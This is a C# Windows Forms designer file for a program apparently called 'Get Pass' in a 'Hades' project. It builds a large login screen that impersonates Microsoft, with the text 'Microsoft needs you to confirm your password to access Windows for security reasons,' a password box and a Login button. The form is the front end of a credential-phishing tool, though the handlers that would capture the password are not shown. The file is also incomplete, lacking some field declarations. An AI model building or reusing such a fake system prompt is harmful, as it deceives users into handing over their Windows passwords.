using System.Windows.Forms;
using System.ComponentModel;
namespace Hades
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.panel1 = new System.Windows.Forms.Panel();
            this.label1 = new System.Windows.Forms.Label();
            this.txtPassword = new System.Windows.Forms.TextBox();
            this.btLogin = new System.Windows.Forms.Button();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // panel1
            // 
            this.panel1.BackColor = System.Drawing.SystemColors.GradientActiveCaption;
            this.panel1.BackgroundImage = global::Hades.Properties.Resources.login;
            this.panel1.Controls.Add(this.label1);
            this.panel1.Controls.Add(this.txtPassword);
            this.panel1.Controls.Add(this.btLogin);
            this.panel1.ForeColor = System.Drawing.SystemColors.MenuHighlight;
            this.panel1.Location = new System.Drawing.Point(524, 165);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(440, 281);
            this.panel1.TabIndex = 0;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.White;
            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.Tomato;
            this.label1.Location = new System.Drawing.Point(41, 167);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(337, 36);
            this.label1.TabIndex = 2;
            this.label1.Text = "Microsoft needs you to confirm your password to \r\naccess Windows for security rea" +
    "sons";
            // 
            // txtPassword
            // 
            this.txtPassword.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.txtPassword.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.txtPassword.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtPassword.ForeColor = System.Drawing.Color.Silver;
            this.txtPassword.Location = new System.Drawing.Point(44, 135);
            this.txtPassword.Name = "txtPassword";
            this.txtPassword.Size = new System.Drawing.Size(348, 19);
            this.txtPassword.TabIndex = 1;
            this.txtPassword.Text = "Enter Windows Password";
            this.txtPassword.Enter += new System.EventHandler(this.txtPassword_Enter);
            this.txtPassword.KeyDown += new System.Windows.Forms.KeyEventHandler(this.txtPassword_KeyDown);
            this.txtPassword.KeyUp += new System.Windows.Forms.KeyEventHandler(this.txtPassword_KeyUp);
            // 
            // btLogin
            // 
            this.btLogin.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.btLogin.BackColor = System.Drawing.Color.RoyalBlue;
            this.btLogin.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btLogin.Font = new System.Drawing.Font("Microsoft JhengHei", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btLogin.ForeColor = System.Drawing.Color.White;
            this.btLogin.Location = new System.Drawing.Point(292, 222);
            this.btLogin.Name = "btLogin";
            this.btLogin.Size = new System.Drawing.Size(100, 38);
            this.btLogin.TabIndex = 0;
            this.btLogin.Text = "Login";
            this.btLogin.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            this.btLogin.UseVisualStyleBackColor = false;
            this.btLogin.Click += new System.EventHandler(this.btLogin_Click);
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1366, 749);
            this.Controls.Add(this.panel1);
            this.Name = "Form1";
            this.Text = "Get Pass";
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Button btLogin;
        private System.Windows.Forms.TextBox txtPassword;
        private System.Windows.Forms.Label label1;
    }
}

